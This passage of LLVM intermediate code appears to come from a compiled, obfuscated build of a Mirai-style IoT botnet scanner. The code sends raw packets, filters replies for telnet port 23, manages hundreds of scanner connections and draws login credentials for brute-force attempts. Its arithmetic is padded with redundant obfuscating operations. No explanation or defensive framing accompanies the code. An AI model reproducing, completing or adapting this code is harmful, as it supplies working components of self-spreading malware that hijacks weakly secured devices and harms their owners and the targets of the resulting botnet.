  %302 = call i64 @sendto(i32 %297, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %301, i32 16)
  br label %303

; <label>:303:                                    ; preds = %248
  %304 = load i32, i32* %1, align 4
  %305 = sub i32 0, 1
  %306 = sub i32 %304, %305
  %307 = add nsw i32 %304, 1
  store i32 %306, i32* %1, align 4
  br label %245

; <label>:308:                                    ; preds = %245
  br label %309

; <label>:309:                                    ; preds = %308, %239
  store i32 0, i32* %12, align 4
  br label %310

; <label>:310:                                    ; preds = %469, %437, %423, %408, %397, %386, %371, %362, %353, %346, %339, %309
  %311 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %23, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.tcphdr*
  store %struct.tcphdr* %315, %struct.tcphdr** %24, align 8
  %316 = call i32* @__errno_location() #9
  store i32 0, i32* %316, align 4
  %317 = load i32, i32* @rsck, align 4
  %318 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %319 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %319, align 8
  %320 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %321 = load %struct.sockaddr*, %struct.sockaddr** %320, align 8
  %322 = call i64 @recvfrom(i32 %317, i8* %318, i64 1514, i32 16384, %struct.sockaddr* %321, i32* null)
  %323 = trunc i64 %322 to i32
  store i32 %323, i32* %21, align 4
  %324 = load i32, i32* %21, align 4
  %325 = icmp sle i32 %324, 0
  br i1 %325, label %334, label %326

; <label>:326:                                    ; preds = %310
  %327 = call i32* @__errno_location() #9
  %328 = load i32, i32* %327, align 4
  %329 = icmp eq i32 %328, 11
  br i1 %329, label %334, label %330

; <label>:330:                                    ; preds = %326
  %331 = call i32* @__errno_location() #9
  %332 = load i32, i32* %331, align 4
  %333 = icmp eq i32 %332, 11
  br i1 %333, label %334, label %335

; <label>:334:                                    ; preds = %330, %326, %310
  br label %481

; <label>:335:                                    ; preds = %330
  %336 = load i32, i32* %21, align 4
  %337 = sext i32 %336 to i64
  %338 = icmp ult i64 %337, 40
  br i1 %338, label %339, label %340

; <label>:339:                                    ; preds = %335
  br label %310

; <label>:340:                                    ; preds = %335
  %341 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 9
  %343 = load i32, i32* %342, align 4
  %344 = load i32, i32* @LOCAL_ADDR, align 4
  %345 = icmp ne i32 %343, %344
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %340
  br label %310

; <label>:347:                                    ; preds = %340
  %348 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 6
  %350 = load i8, i8* %349, align 1
  %351 = zext i8 %350 to i32
  %352 = icmp ne i32 %351, 6
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %347
  br label %310

; <label>:354:                                    ; preds = %347
  %355 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  %357 = load i16, i16* %356, align 4
  %358 = zext i16 %357 to i32
  %359 = call zeroext i16 @htons(i16 zeroext 23) #9
  %360 = zext i16 %359 to i32
  %361 = icmp ne i32 %358, %360
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %354
  br label %310

; <label>:363:                                    ; preds = %354
  %364 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 1
  %366 = load i16, i16* %365, align 2
  %367 = zext i16 %366 to i32
  %368 = load i16, i16* %2, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp ne i32 %367, %369
  br i1 %370, label %371, label %372

; <label>:371:                                    ; preds = %363
  br label %310

; <label>:372:                                    ; preds = %363
  %373 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 4
  %375 = load i16, i16* %374, align 4
  %376 = lshr i16 %375, 9
  %377 = xor i16 %376, -1
  %378 = xor i16 1, -1
  %379 = xor i16 -30311, -1
  %380 = or i16 %377, %378
  %381 = or i16 -30311, %379
  %382 = xor i16 %380, -1
  %383 = and i16 %382, %381
  %384 = and i16 %376, 1
  %385 = icmp ne i16 %383, 0
  br i1 %385, label %387, label %386

; <label>:386:                                    ; preds = %372
  br label %310

; <label>:387:                                    ; preds = %372
  %388 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = lshr i16 %390, 12
  %392 = xor i16 1, -1
  %393 = xor i16 %391, %392
  %394 = and i16 %393, %391
  %395 = and i16 %391, 1
  %396 = icmp ne i16 %394, 0
  br i1 %396, label %398, label %397

; <label>:397:                                    ; preds = %387
  br label %310

; <label>:398:                                    ; preds = %387
  %399 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 4
  %401 = load i16, i16* %400, align 4
  %402 = lshr i16 %401, 10
  %403 = xor i16 1, -1
  %404 = xor i16 %402, %403
  %405 = and i16 %404, %402
  %406 = and i16 %402, 1
  %407 = icmp ne i16 %405, 0
  br i1 %407, label %408, label %409

; <label>:408:                                    ; preds = %398
  br label %310

; <label>:409:                                    ; preds = %398
  %410 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 4
  %412 = load i16, i16* %411, align 4
  %413 = lshr i16 %412, 8
  %414 = xor i16 %413, -1
  %415 = xor i16 1, -1
  %416 = xor i16 -29674, -1
  %417 = or i16 %414, %415
  %418 = or i16 -29674, %416
  %419 = xor i16 %417, -1
  %420 = and i16 %419, %418
  %421 = and i16 %413, 1
  %422 = icmp ne i16 %420, 0
  br i1 %422, label %423, label %424

; <label>:423:                                    ; preds = %409
  br label %310

; <label>:424:                                    ; preds = %409
  %425 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 3
  %427 = load i32, i32* %426, align 4
  %428 = call i32 @ntohl(i32 %427) #9
  %429 = sub i32 0, 1
  %430 = add i32 %428, %429
  %431 = sub i32 %428, 1
  %432 = call i32 @htonl(i32 %430) #9
  %433 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 8
  %435 = load i32, i32* %434, align 4
  %436 = icmp ne i32 %432, %435
  br i1 %436, label %437, label %438

; <label>:437:                                    ; preds = %424
  br label %310

; <label>:438:                                    ; preds = %424
  store %struct.scanner_connection* null, %struct.scanner_connection** %25, align 8
  %439 = load i32, i32* %12, align 4
  store i32 %439, i32* %21, align 4
  br label %440

; <label>:440:                                    ; preds = %458, %438
  %441 = load i32, i32* %21, align 4
  %442 = icmp slt i32 %441, 628
  br i1 %442, label %443, label %465

; <label>:443:                                    ; preds = %440
  %444 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %445 = load i32, i32* %21, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %444, i64 %446
  %448 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %447, i32 0, i32 16
  %449 = load i32, i32* %448, align 8
  %450 = icmp eq i32 %449, 0
  br i1 %450, label %451, label %457

; <label>:451:                                    ; preds = %443
  %452 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %453 = load i32, i32* %21, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %452, i64 %454
  store %struct.scanner_connection* %455, %struct.scanner_connection** %25, align 8
  %456 = load i32, i32* %21, align 4
  store i32 %456, i32* %12, align 4
  br label %465

; <label>:457:                                    ; preds = %443
  br label %458

; <label>:458:                                    ; preds = %457
  %459 = load i32, i32* %21, align 4
  %460 = sub i32 0, %459
  %461 = sub i32 0, 1
  %462 = add i32 %460, %461
  %463 = sub i32 0, %462
  %464 = add nsw i32 %459, 1
  store i32 %463, i32* %21, align 4
  br label %440

; <label>:465:                                    ; preds = %451, %440
  %466 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %467 = icmp eq %struct.scanner_connection* %466, null
  br i1 %467, label %468, label %469

; <label>:468:                                    ; preds = %465
  br label %481

; <label>:469:                                    ; preds = %465
  %470 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 8
  %472 = load i32, i32* %471, align 4
  %473 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %474 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %473, i32 0, i32 15
  store i32 %472, i32* %474, align 4
  %475 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %476 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %475, i32 0, i32 0
  %477 = load i16, i16* %476, align 4
  %478 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %479 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %478, i32 0, i32 13
  store i16 %477, i16* %479, align 8
  %480 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %480)
  br label %310

; <label>:481:                                    ; preds = %468, %334
  br label %482

; <label>:482:                                    ; preds = %481
  %483 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %484 = getelementptr inbounds [16 x i64], [16 x i64]* %483, i64 0, i64 0
  %485 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %484) #7, !srcloc !3
  %486 = extractvalue { i64, i64* } %485, 0
  %487 = extractvalue { i64, i64* } %485, 1
  %488 = trunc i64 %486 to i32
  store i32 %488, i32* %27, align 4
  %489 = ptrtoint i64* %487 to i64
  %490 = trunc i64 %489 to i32
  store i32 %490, i32* %28, align 4
  br label %491

; <label>:491:                                    ; preds = %482
  br label %492

; <label>:492:                                    ; preds = %491
  %493 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %494 = getelementptr inbounds [16 x i64], [16 x i64]* %493, i64 0, i64 0
  %495 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %494) #7, !srcloc !4
  %496 = extractvalue { i64, i64* } %495, 0
  %497 = extractvalue { i64, i64* } %495, 1
  %498 = trunc i64 %496 to i32
  store i32 %498, i32* %29, align 4
  %499 = ptrtoint i64* %497 to i64
  %500 = trunc i64 %499 to i32
  store i32 %500, i32* %30, align 4
  br label %501

; <label>:501:                                    ; preds = %492
  store i32 0, i32* %1, align 4
  br label %502

; <label>:502:                                    ; preds = %638, %501
  %503 = load i32, i32* %1, align 4
  %504 = icmp slt i32 %503, 628
  br i1 %504, label %505, label %643

; <label>:505:                                    ; preds = %502
  %506 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %507 = load i32, i32* %1, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %506, i64 %508
  store %struct.scanner_connection* %509, %struct.scanner_connection** %10, align 8
  %510 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %510, i32 0, i32 16
  %512 = load i32, i32* %511, align 8
  %513 = icmp ugt i32 %512, 1
  %514 = select i1 %513, i32 30, i32 5
  store i32 %514, i32* %31, align 4
  %515 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %516 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %515, i32 0, i32 16
  %517 = load i32, i32* %516, align 8
  %518 = icmp ne i32 %517, 0
  br i1 %518, label %519, label %568

; <label>:519:                                    ; preds = %505
  %520 = load i32, i32* @fake_time, align 4
  %521 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %522 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %521, i32 0, i32 3
  %523 = load i32, i32* %522, align 4
  %524 = add i32 %520, -1903955821
  %525 = sub i32 %524, %523
  %526 = sub i32 %525, -1903955821
  %527 = sub i32 %520, %523
  %528 = load i32, i32* %31, align 4
  %529 = icmp ugt i32 %526, %528
  br i1 %529, label %530, label %568

; <label>:530:                                    ; preds = %519
  %531 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %532 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %531, i32 0, i32 2
  %533 = load i32, i32* %532, align 8
  %534 = icmp eq i32 %533, -1
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %530
  br label %638

; <label>:536:                                    ; preds = %530
  %537 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %538 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %537, i32 0, i32 2
  %539 = load i32, i32* %538, align 8
  %540 = call i32 @close(i32 %539)
  %541 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %542 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %541, i32 0, i32 2
  store i32 -1, i32* %542, align 8
  %543 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %544 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %543, i32 0, i32 16
  %545 = load i32, i32* %544, align 8
  %546 = icmp ugt i32 %545, 2
  br i1 %546, label %547, label %562

; <label>:547:                                    ; preds = %536
  %548 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %549 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %548, i32 0, i32 9
  %550 = load i8, i8* %549, align 4
  %551 = add i8 %550, 22
  %552 = add i8 %551, 1
  %553 = sub i8 %552, 22
  %554 = add i8 %550, 1
  store i8 %553, i8* %549, align 4
  %555 = zext i8 %553 to i32
  %556 = icmp eq i32 %555, 10
  br i1 %556, label %557, label %559

; <label>:557:                                    ; preds = %547
  %558 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %558, i32 1)
  br label %561

; <label>:559:                                    ; preds = %547
  %560 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %560)
  br label %561

; <label>:561:                                    ; preds = %559, %557
  br label %567

; <label>:562:                                    ; preds = %536
  %563 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %564 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %563, i32 0, i32 9
  store i8 0, i8* %564, align 4
  %565 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %566 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %565, i32 0, i32 16
  store i32 0, i32* %566, align 8
  br label %567

; <label>:567:                                    ; preds = %562, %561
  br label %638

; <label>:568:                                    ; preds = %519, %505
  %569 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %570 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %569, i32 0, i32 16
  %571 = load i32, i32* %570, align 8
  %572 = icmp eq i32 %571, 1
  br i1 %572, label %573, label %602

; <label>:573:                                    ; preds = %568
  %574 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %575 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %574, i32 0, i32 2
  %576 = load i32, i32* %575, align 8
  %577 = srem i32 %576, 64
  %578 = zext i32 %577 to i64
  %579 = shl i64 1, %578
  %580 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %581 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %581, i32 0, i32 2
  %583 = load i32, i32* %582, align 8
  %584 = sdiv i32 %583, 64
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds [16 x i64], [16 x i64]* %580, i64 0, i64 %585
  %587 = load i64, i64* %586, align 8
  %588 = and i64 %587, %579
  %589 = xor i64 %587, %579
  %590 = or i64 %588, %589
  %591 = or i64 %587, %579
  store i64 %590, i64* %586, align 8
  %592 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %593 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %592, i32 0, i32 2
  %594 = load i32, i32* %593, align 8
  %595 = load i32, i32* %15, align 4
  %596 = icmp sgt i32 %594, %595
  br i1 %596, label %597, label %601

; <label>:597:                                    ; preds = %573
  %598 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %599 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %598, i32 0, i32 2
  %600 = load i32, i32* %599, align 8
  store i32 %600, i32* %15, align 4
  br label %601

; <label>:601:                                    ; preds = %597, %573
  br label %637

; <label>:602:                                    ; preds = %568
  %603 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %604 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %603, i32 0, i32 16
  %605 = load i32, i32* %604, align 8
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %636

; <label>:607:                                    ; preds = %602
  %608 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %609 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %608, i32 0, i32 2
  %610 = load i32, i32* %609, align 8
  %611 = srem i32 %610, 64
  %612 = zext i32 %611 to i64
  %613 = shl i64 1, %612
  %614 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %615 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %616 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %615, i32 0, i32 2
  %617 = load i32, i32* %616, align 8
  %618 = sdiv i32 %617, 64
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds [16 x i64], [16 x i64]* %614, i64 0, i64 %619
  %621 = load i64, i64* %620, align 8
  %622 = and i64 %621, %613
  %623 = xor i64 %621, %613
  %624 = or i64 %622, %623
  %625 = or i64 %621, %613
  store i64 %624, i64* %620, align 8
  %626 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %627 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %626, i32 0, i32 2
  %628 = load i32, i32* %627, align 8
  %629 = load i32, i32* %14, align 4
  %630 = icmp sgt i32 %628, %629
  br i1 %630, label %631, label %635

; <label>:631:                                    ; preds = %607
  %632 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %633 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %632, i32 0, i32 2
  %634 = load i32, i32* %633, align 8
  store i32 %634, i32* %14, align 4
  br label %635

; <label>:635:                                    ; preds = %631, %607
  br label %636

; <label>:636:                                    ; preds = %635, %602
  br label %637

; <label>:637:                                    ; preds = %636, %601
  br label %638

; <label>:638:                                    ; preds = %637, %567, %535
  %639 = load i32, i32* %1, align 4
  %640 = sub i32 0, 1
  %641 = sub i32 %639, %640
  %642 = add nsw i32 %639, 1
  store i32 %641, i32* %1, align 4
  br label %502

; <label>:643:                                    ; preds = %502
  %644 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %644, align 8
  %645 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %645, align 8
  %646 = load i32, i32* %15, align 4
  %647 = load i32, i32* %14, align 4
  %648 = icmp sgt i32 %646, %647
  br i1 %648, label %649, label %651

; <label>:649:                                    ; preds = %643
  %650 = load i32, i32* %15, align 4
  br label %653

; <label>:651:                                    ; preds = %643
  %652 = load i32, i32* %14, align 4
  br label %653

; <label>:653:                                    ; preds = %651, %649
  %654 = phi i32 [ %650, %649 ], [ %652, %651 ]
  %655 = add i32 1, -282257094
  %656 = add i32 %655, %654
  %657 = sub i32 %656, -282257094
  %658 = add nsw i32 1, %654
  %659 = call i32 @select(i32 %657, %struct.__sigset_t* %8, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %11)
  %660 = call i64 @time(i64* null) #7
  %661 = trunc i64 %660 to i32
  store i32 %661, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %662

; <label>:662:                                    ; preds = %1318, %653
  %663 = load i32, i32* %1, align 4
  %664 = icmp slt i32 %663, 628
  br i1 %664, label %665, label %1325

; <label>:665:                                    ; preds = %662
  %666 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %667 = load i32, i32* %1, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %666, i64 %668
  store %struct.scanner_connection* %669, %struct.scanner_connection** %10, align 8
  %670 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %671 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %670, i32 0, i32 2
  %672 = load i32, i32* %671, align 8
  %673 = icmp eq i32 %672, -1
  br i1 %673, label %674, label %675

; <label>:674:                                    ; preds = %665
  br label %1318

; <label>:675:                                    ; preds = %665
  %676 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %677 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %678 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %677, i32 0, i32 2
  %679 = load i32, i32* %678, align 8
  %680 = sdiv i32 %679, 64
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds [16 x i64], [16 x i64]* %676, i64 0, i64 %681
  %683 = load i64, i64* %682, align 8
  %684 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %685 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %684, i32 0, i32 2
  %686 = load i32, i32* %685, align 8
  %687 = srem i32 %686, 64
  %688 = zext i32 %687 to i64
  %689 = shl i64 1, %688
  %690 = xor i64 %689, -1
  %691 = xor i64 %683, %690
  %692 = and i64 %691, %683
  %693 = and i64 %683, %689
  %694 = icmp ne i64 %692, 0
  br i1 %694, label %695, label %729

; <label>:695:                                    ; preds = %675
  store i32 0, i32* %32, align 4
  store i32 4, i32* %33, align 4
  %696 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %696, i32 0, i32 2
  %698 = load i32, i32* %697, align 8
  %699 = bitcast i32* %32 to i8*
  %700 = call i32 @getsockopt(i32 %698, i32 1, i32 4, i8* %699, i32* %33) #7
  %701 = load i32, i32* %32, align 4
  %702 = icmp ne i32 %701, 0
  br i1 %702, label %703, label %714

; <label>:703:                                    ; preds = %695
  %704 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %705 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %704, i32 0, i32 2
  %706 = load i32, i32* %705, align 8
  %707 = call i32 @close(i32 %706)
  %708 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %709 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %708, i32 0, i32 2
  store i32 -1, i32* %709, align 8
  %710 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %711 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %710, i32 0, i32 9
  store i8 0, i8* %711, align 4
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %713 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %712, i32 0, i32 16
  store i32 0, i32* %713, align 8
  br label %1318

; <label>:714:                                    ; preds = %695
  %715 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %716 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %715, i32 0, i32 16
  store i32 2, i32* %716, align 8
  %717 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %717, i32 0, i32 1
  %719 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %718, i32 0, i32 0
  %720 = load i32, i32* %719, align 8
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %726, label %722

; <label>:722:                                    ; preds = %714
  %723 = call %struct.scanner_auth* @random_auth_entry()
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 0
  store %struct.scanner_auth* %723, %struct.scanner_auth** %725, align 8
  br label %726

; <label>:726:                                    ; preds = %722, %714
  %727 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %728 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %727, i32 0, i32 4
  store i32 0, i32* %728, align 8
  br label %729

; <label>:729:                                    ; preds = %726, %675
  %730 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %731 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %732 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %731, i32 0, i32 2
  %733 = load i32, i32* %732, align 8
  %734 = sdiv i32 %733, 64
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds [16 x i64], [16 x i64]* %730, i64 0, i64 %735
  %737 = load i64, i64* %736, align 8
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %739 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %738, i32 0, i32 2
  %740 = load i32, i32* %739, align 8
  %741 = srem i32 %740, 64
  %742 = zext i32 %741 to i64
  %743 = shl i64 1, %742
  %744 = xor i64 %737, -1
  %745 = xor i64 %743, -1
  %746 = xor i64 6856935585620204805, -1
  %747 = or i64 %744, %745
  %748 = or i64 6856935585620204805, %746
  %749 = xor i64 %747, -1
  %750 = and i64 %749, %748
  %751 = and i64 %737, %743
  %752 = icmp ne i64 %750, 0
  br i1 %752, label %753, label %1317

; <label>:753:                                    ; preds = %729
  br label %754

; <label>:754:                                    ; preds = %1315, %753
  %755 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %756 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %755, i32 0, i32 16
  %757 = load i32, i32* %756, align 8
  %758 = icmp eq i32 %757, 0
  br i1 %758, label %759, label %760

; <label>:759:                                    ; preds = %754
  br label %1316

; <label>:760:                                    ; preds = %754
  %761 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %762 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %761, i32 0, i32 4
  %763 = load i32, i32* %762, align 8
  %764 = icmp sgt i32 %763, 7168
  br i1 %764, label %765, label %780

; <label>:765:                                    ; preds = %760
  %766 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %766, i32 0, i32 7
  %768 = getelementptr inbounds [8192 x i8], [8192 x i8]* %767, i32 0, i32 0
  %769 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %770 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %769, i32 0, i32 7
  %771 = getelementptr inbounds [8192 x i8], [8192 x i8]* %770, i32 0, i32 0
  %772 = getelementptr inbounds i8, i8* %771, i64 6144
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %768, i8* %772, i64 2048, i32 1, i1 false)
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 4
  %775 = load i32, i32* %774, align 8
  %776 = add i32 %775, 178526326
  %777 = sub i32 %776, 6144
  %778 = sub i32 %777, 178526326
  %779 = sub nsw i32 %775, 6144
  store i32 %778, i32* %774, align 8
  br label %780

; <label>:780:                                    ; preds = %765, %760
  %781 = call i32* @__errno_location() #9
  store i32 0, i32* %781, align 4
  %782 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %783 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %782, i32 0, i32 2
  %784 = load i32, i32* %783, align 8
  %785 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %786 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %785, i32 0, i32 7
  %787 = getelementptr inbounds [8192 x i8], [8192 x i8]* %786, i32 0, i32 0
  %788 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %789 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %788, i32 0, i32 4
  %790 = load i32, i32* %789, align 8
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds i8, i8* %787, i64 %791
  %793 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
